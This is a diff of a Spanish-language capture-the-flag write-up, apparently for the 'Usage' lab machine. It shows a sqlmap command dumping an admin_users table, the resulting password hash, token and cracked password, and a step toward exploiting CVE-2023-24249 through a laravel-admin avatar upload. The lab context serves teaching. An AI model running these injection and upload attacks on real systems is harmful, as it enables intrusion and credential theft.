@@ -152,6 +152,14 @@ La base de datos admin_users nos llama la atención. Procedemos a su enumeració
 ```bash
 # sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch -D usage_blog -T admin_users --dump
 <contenido omitido>
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
 <contenido omitido>
 ```
 <br>
@@ -168,6 +176,14 @@ whatever1        (?)
 ```
 
 Ahora que tenemos el usuario (admin) y la contraseña (whatever1), comprobaremos si son válidas para acceder al panel de administración.
+<p align="left">
+    <img src="imagenes/usage_5.png" alt="usage_5" width="500"  />
+</p>
+
+Revisando la información del dashboard, podemos observar que la aplicación usa laravel-admin 1.8.18. Una búsqueda en internet sobre las vulnerabilidades de esta versión nos lleva hasta la vulnerabilidad CVE-2023-24249, la cual permite subir código arbitrario mediante el abuso de una panel de subida de archivos.
+
+Navegaos hasta la URL http://admin.usage.htb/admin/auth/setting. En avatar subimos una foto cualquiera, interceptando la petición con Burpsuite.
+
 
 <br>
 
